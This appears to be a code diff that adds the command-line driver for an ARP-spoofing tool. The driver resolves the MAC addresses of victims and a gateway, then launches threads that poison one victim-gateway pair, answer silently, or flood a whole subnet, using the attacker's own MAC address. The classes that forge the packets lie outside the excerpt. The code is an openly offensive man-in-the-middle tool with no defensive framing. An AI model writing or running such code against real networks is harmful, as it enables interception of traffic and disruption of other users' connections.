@@ -281,3 +281,48 @@ if __name__ == "__main__":
     )
 
     args = parser.parse_args()
+
+    args = parser.parse_args()
+
+    attacker_mac = get_if_hwaddr(args.iface)
+    mgr = PoisonManager()
+
+    try:
+        if args.mode in ("pair", "silent"):
+            if not (args.victims and args.gateway):
+                parser.error("--victims and --gateway required")
+
+            gateway_ip  = args.gateway
+            gateway_mac = resolve_mac(gateway_ip)
+            victim_ips  = [ip.strip() for ip in args.victims.split(",")]
+
+            for vip in victim_ips:
+                vmac = resolve_mac(vip)
+                if args.mode == "pair":
+                    thr = ActivePairSpoofer(args.iface,
+                                            (vip, vmac),
+                                            (gateway_ip, gateway_mac),
+                                            attacker_mac,
+                                            args.interval)
+                else:
+                    thr = SilentResponder(args.iface,
+                                        (vip, vmac),
+                                        (gateway_ip, gateway_mac),
+                                        attacker_mac)
+                mgr.add(thr)
+
+        elif args.mode == "flood":
+            if not (args.cidr and args.gateway):
+                parser.error("--cidr and --gateway required for flood mode")
+            thr = FloodSpoofer(args.iface, args.cidr, args.gateway,
+                            attacker_mac, args.interval)
+            mgr.add(thr)
+
+        # graceful Ctrl-C
+        signal.signal(signal.SIGINT, mgr.stop_all)
+        for t in mgr.threads:
+            t.join()
+
+    except Exception as exc:
+        log.error(str(exc))
+        mgr.stop_all()
